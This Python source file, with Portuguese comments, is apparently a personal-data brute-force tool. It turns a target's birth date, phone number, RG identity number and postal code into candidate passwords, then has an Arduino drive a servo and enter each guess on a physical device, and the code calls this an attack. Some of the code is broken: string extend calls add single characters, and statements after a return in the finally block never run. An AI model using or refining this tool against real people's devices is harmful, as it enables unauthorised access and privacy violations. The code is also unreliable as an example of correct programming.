import time
from gerenciamento_senhas import adicionar_senha_tentada, aguardar_resposta_arduino
from serial import Serial

def generate_combinations(day, month, year):
    """Gera as combinações de data conforme a lógica original e remove zeros à esquerda quando necessário."""
    # Remove o zero à esquerda se o dia ou mês for menor que 10
    day_no_leading_zero = day.lstrip("0")
    month_no_leading_zero = month.lstrip("0")
    two_digit_year = year[-2:]  # Pega os dois últimos dígitos do ano
    
    return [
        day + month,                           # Dia + Mês
        month + day,                           # Mês + Dia
        month + two_digit_year,                # Mês + Ano (2 dígitos)
        month + year,                          # Mês + Ano
        day + year,                            # Dia + Ano
        two_digit_year + month,                # Ano (2 dígitos) + Mês
        day + two_digit_year,                  # Dia + Ano (2 dígitos)
        two_digit_year + day,                  # Ano (2 dígitos) + Dia
        year,                                  # Apenas Ano
        day + month + two_digit_year,          # Dia + Mês + Ano (2 dígitos)
        
        # Combinações sem zero à esquerda para dia e mês
        day_no_leading_zero + month_no_leading_zero,  # Dia sem zero + Mês sem zero
        month_no_leading_zero + day_no_leading_zero,  # Mês sem zero + Dia sem zero
        day_no_leading_zero + two_digit_year,         # Dia sem zero + Ano (2 dígitos)
        month_no_leading_zero + two_digit_year,       # Mês sem zero + Ano (2 dígitos)
        day_no_leading_zero + month_no_leading_zero + two_digit_year  # Dia + Mês sem zero + Ano (2 dígitos)
    ]


def generate_passwords_from_user_data(birth_date, phone, important_date, rg, cep):
    """Gera uma lista de senhas com base em informações pessoais.""" 
    passwords = []

    # Função auxiliar para validar e processar datas
    def process_date(date):
        if not date:
            return ["", "", ""]  # Retorna valores padrão vazios para datas inválidas
        elif "/" in date:
            parts = date.split("/")
            # Preenche partes ausentes com valores vazios
            return (parts + [""] * (3 - len(parts)))[:3]
        else:
            # Interpreta uma string contínua de números como dia, mês e ano
            return [date[:2].zfill(2), date[2:4].zfill(2), date[4:].zfill(4)]

    # Processa a data de nascimento
    birth_day, birth_month, birth_year = process_date(birth_date)
    passwords.extend(generate_combinations(birth_day, birth_month, birth_year))

    # Processa a data importante
    important_day, important_month, important_year = process_date(important_date)
    passwords.extend(generate_combinations(important_day, important_month, important_year))

    # Combinações de telefone com a data de nascimento
    phone_area_code = phone[:4] if phone and len(phone) >= 4 else ""  # Usa string vazia para valores inválidos
    passwords.append(phone_area_code + birth_day + birth_month)  # Ex: 2190101
    passwords.append(phone_area_code + birth_month + birth_year[-2:] if len(birth_year) >= 2 else "")

    # Combinações com RG e CEP
    rg_str = rg.zfill(9) if rg else ""  # RG com zeros à esquerda (até 9 dígitos)
    cep_str = cep.zfill(8) if cep else ""  # CEP com zeros à esquerda (8 dígitos)

    # Misturas entre RG, CEP e telefone
    for i in range(len(phone)):
        for j in range(len(rg)):
            for k in range(len(cep)):
                passwords.extend(phone[:i])
                passwords.extend(phone[:i] + rg_str[:j])
                passwords.extend(rg_str[:j] + phone[:i])
                passwords.extend(phone[:i] + cep_str[:j])
                passwords.extend(cep_str[:j] + phone[:i])
                passwords.extend(phone[:i] + rg_str[:j] + cep_str[:k])
                passwords.extend(rg_str[:j] + phone[:i] + cep_str[:k])
                passwords.extend(cep_str[:k] + phone[:i] + rg_str[:j])

    # Retorna lista única (sem duplicados)
    return list(set(passwords))


def tentar_senhas(user_passwords, tam_min, tam_max, ataque_ativo_callback, exibir_mensagem, arduino):
    """Tenta as senhas geradas e verifica se o ataque foi interrompido."""
    exibir_mensagem("Iniciando ataque...")

    # Filtra senhas com tamanho fora do intervalo [tam_min, tam_max] e remove duplicatas
    user_passwords = [password for password in user_passwords if tam_min <= len(password) <= tam_max]
    # password for password funciona como um if dentro do list comprehension
    # list comprehension cria uma nova lista com os elementos que passaram no teste

    try:
        for password in user_passwords:
            if not ataque_ativo_callback():
                exibir_mensagem("Ataque interrompido.")
                break
            
            if adicionar_senha_tentada(password):
                exibir_mensagem(f"Tentando senha: {password}")
                time.sleep(0.5)
                arduino.write(("Gira servo\n").encode())
                time.sleep(1)
                arduino.write(("Volta servo\n").encode())
                time.sleep(1)
                arduino.write((password + "\n").encode())

                if aguardar_resposta_arduino(arduino, exibir_mensagem):
                    return  # Senha correta, encerra o processo

                time.sleep(0.1)

    except Exception as e:
        exibir_mensagem(f"Erro na comunicação serial: {e}")
    finally:
        return
        try:
            arduino.close()
        except NameError:
            pass

    exibir_mensagem("Fim do ataque (todas as tentativas concluídas ou interrompidas).")
